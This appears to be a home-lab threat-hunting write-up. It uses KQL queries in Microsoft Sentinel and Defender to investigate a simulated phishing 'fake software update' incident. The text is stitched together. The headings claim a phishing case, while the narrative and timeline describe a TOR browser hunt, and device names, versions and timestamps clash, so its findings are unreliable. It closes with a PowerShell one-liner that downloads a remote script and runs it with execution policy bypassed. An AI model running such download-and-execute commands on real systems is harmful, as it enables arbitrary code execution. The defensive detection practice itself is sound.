<img width="700*500" src="https://github.com/user-attachments/assets/e9d2fd77-dc9f-4faa-a735-925e1d3a25f0" alt="Tor Logo with the onion and a crosshair on it"/>

# Incident Response: Phishing Fake Software Update!"

Scenario Overview
Organization: Medium-sized company specializing in financial technology.
Threat: Employees report unusual system behavior after clicking on a suspicious software update notification.
Objective: Identify the phishing campaign's scope, mitigate its impact, and prevent recurrence.

## Platforms and Languages Leveraged
- Microsoft sentinel SIEM
- EDR Platform: Microsoft Defender for Endpoint
- Kusto Query Language (KQL)
- Windows 10 Virtual Machines (Microsoft Azure)

### High-Level TOR-Related IoC Discovery Plan

- **Check `DeviceFileEvents`** for any file events.
- **Check `DeviceProcessEvents`** for any signs of installation or usage.
- **Check `DeviceNetworkEvents`** for any signs of outgoing connections over known ports.

```kql
DeviceFileEvents
| top 50 by Timestamp desc
```
```kql
DeviceNetworkEvents
| top 50 by Timestamp desc
```
```kql
DeviceProcessEvents
| top 50 by Timestamp desc
```
---

## Steps Taken

### 1. Searched the `DeviceFileEvents` Table

Searched for any file that had the string "tor" in it and discovered what looks like the user "employee" downloaded a TOR installer, did something that resulted in many TOR-related files being copied to the desktop, and the creation of a file called `tor-shopping-list.txt` on the desktop at `2025-01-08T16:27:19.7259964Z`. These events began at `2025-01-08T16:14:48.6065231Z`.

**Query used to locate events:**

```kql
DeviceFileEvents
| where DeviceName == "tphish"
| where FileName endswith "ps1"
| order by Timestamp desc 
```
![Screenshot 2025-01-26 131545](https://github.com/user-attachments/assets/0f60aaaa-fc7c-456e-8680-5a2a3d7ed5db)


---

### 2. Searched the `DeviceProcessEvents` Table

Searched for any `ProcessCommandLine` that contained the string "tor-browser-windows-x86_64-portable-14.0.1.exe". Based on the logs returned, at `2025-01-08T16:16:47.4484567Z`, an employee on the "vthreattor" device ran the file `tor-browser-windows-x86_64-portable-14.0.4.exe` from their Downloads folder, using a command that triggered a silent installation.

**Query used to locate event:**

```kql

let VMName = "tphish";
let specificTime = datetime(2025-01-26T19:01:29.0367754Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
| where DeviceName == VMName
| order by Timestamp desc
```
![Screenshot 2025-01-26 133010](https://github.com/user-attachments/assets/31b64c99-ad4f-48c1-b89f-ff5a34d5962f)

---

### 3. Searched the `DeviceProcessEvents` Table for TOR Browser Execution

Searched for any indication that user "employee" actually opened the TOR browser. There was evidence that they did open it at `2025-01-08T16:17:21.6357935Z`. There were several other instances of `firefox.exe` (TOR) as well as `tor.exe` spawned afterwards.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "phishingFakeSoftwareUpdate.ps1" or ProcessCommandLine contains "Add-Type -AssemblyName PresentationFramework"
| extend Timestamp = Timestamp, InitiatingProcessAccountName = InitiatingProcessAccountName
| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessAccountName, InitiatingProcessCommandLine
| order by Timestamp desc
```

![Screenshot 2025-01-26 134312](https://github.com/user-attachments/assets/31820b28-e89e-4e42-9ea5-24060e2a7508)

---

### 4. Searched the `DeviceNetworkEvents` Table for TOR Network Connections

Searched for any indication the TOR browser was used to establish a connection using any of the known TOR ports. At `2025-01-08T14:18:01.1246358Z`, an employee on the "threat-hunt-lab" device successfully established a connection to the remote IP address `176.198.159.33` on port `9001`. The connection was initiated by the process `tor.exe`, located in the folder `c:\users\employee\desktop\tor browser\browser\torbrowser\tor\tor.exe`. There were a couple of other connections to sites over port `443`.

**Query used to locate events:**

```kql
union DeviceNetworkEvents, DeviceProcessEvents
| where Timestamp > ago(6h)
| where RemoteUrl contains "raw.githubusercontent.com" or InitiatingProcessCommandLine has "phishingFakeSoftwareUpdate.ps1"
| project Timestamp, DeviceName, RemoteUrl, RemoteIP, InitiatingProcessCommandLine, FileName, FolderPath, ActionType
| order by Timestamp desc
```

![Screenshot 2025-01-26 140306](https://github.com/user-attachments/assets/57e0f5be-cb30-49b7-bcc6-e5e5dedd64df)

---

## Chronological Event Timeline 

### 1. File Download - TOR Installer

- **Timestamp:** `2025-01-08T14:14:48.6065231Z`
- **Event:** The user "employee" downloaded a file named `tor-browser-windows-x86_64-portable-14.0.1.exe` to the Downloads folder.
- **Action:** File download detected.
- **File Path:** `C:\Users\employee\Downloads\tor-browser-windows-x86_64-portable-14.0.1.exe`

### 2. Process Execution - TOR Browser Installation

- **Timestamp:** `2025-01-08T14:16:47.4484567Z`
- **Event:** The user "employee" executed the file `tor-browser-windows-x86_64-portable-14.0.1.exe` in silent mode, initiating a background installation of the TOR Browser.
- **Action:** Process creation detected.
- **Command:** `tor-browser-windows-x86_64-portable-14.0.1.exe /S`
- **File Path:** `C:\Users\employee\Downloads\tor-browser-windows-x86_64-portable-14.0.1.exe`

### 3. Process Execution - TOR Browser Launch

- **Timestamp:** `2025-01-08T14:17:21.6357935Z`
- **Event:** User "employee" opened the TOR browser. Subsequent processes associated with TOR browser, such as `firefox.exe` and `tor.exe`, were also created, indicating that the browser launched successfully.
- **Action:** Process creation of TOR browser-related executables detected.
- **File Path:** `C:\Users\employee\Desktop\Tor Browser\Browser\TorBrowser\Tor\tor.exe`

### 4. Network Connection - TOR Network

- **Timestamp:** `2025-01-08T14:18:01.1246358Z`
- **Event:** A network connection to IP `176.198.159.33` on port `9001` by user "employee" was established using `tor.exe`, confirming TOR browser network activity.
- **Action:** Connection success.
- **Process:** `tor.exe`
- **File Path:** `c:\users\employee\desktop\tor browser\browser\torbrowser\tor\tor.exe`

### 5. Additional Network Connections - TOR Browser Activity

- **Timestamps:**
  - `2025-01-08T14:18:08Z` - Connected to `194.164.169.85` on port `443`.
  - `2025-01-08T14:18:16Z` - Local connection to `127.0.0.1` on port `9150`.
- **Event:** Additional TOR network connections were established, indicating ongoing activity by user "employee" through the TOR browser.
- **Action:** Multiple successful connections detected.

### 6. File Creation - TOR Shopping List

- **Timestamp:** `2025-01-08T14:19.7259964Z`
- **Event:** The user "employee" created a file named `tor-shopping-list.txt` on the desktop, potentially indicating a list or notes related to their TOR browser activities.
- **Action:** File creation detected.
- **File Path:** `C:\Users\employee\Desktop\tor-shopping-list.txt`

---

## Summary

The user "employee" on the "threat-hunt-lab" device initiated and completed the installation of the TOR browser. They proceeded to launch the browser, establish connections within the TOR network, and created various files related to TOR on their desktop, including a file named `tor-shopping-list.txt`. This sequence of activities indicates that the user actively installed, configured, and used the TOR browser, likely for anonymous browsing purposes, with possible documentation in the form of the "shopping list" file.

---

## Response Taken

TOR usage was confirmed on the endpoint `threat-hunt-lab` by the user `employee`. The device was isolated, and the user's direct manager was notified.

---

##  Copy of the link to get the harmless powershell payload:
```
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/TrevinoParker7/Powershell-test-payload-harmless/refs/heads/main/phishingFakeSoftwareUpdate.ps1' -OutFile 'C:\programdata\phishingFakeSoftwareUpdate.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\phishingFakeSoftwareUpdate.ps1
```

https://raw.githubusercontent.com/TrevinoParker7/Powershell-test-payload-harmless/refs/heads/main/phishingFakeSoftwareUpdate.ps1
---

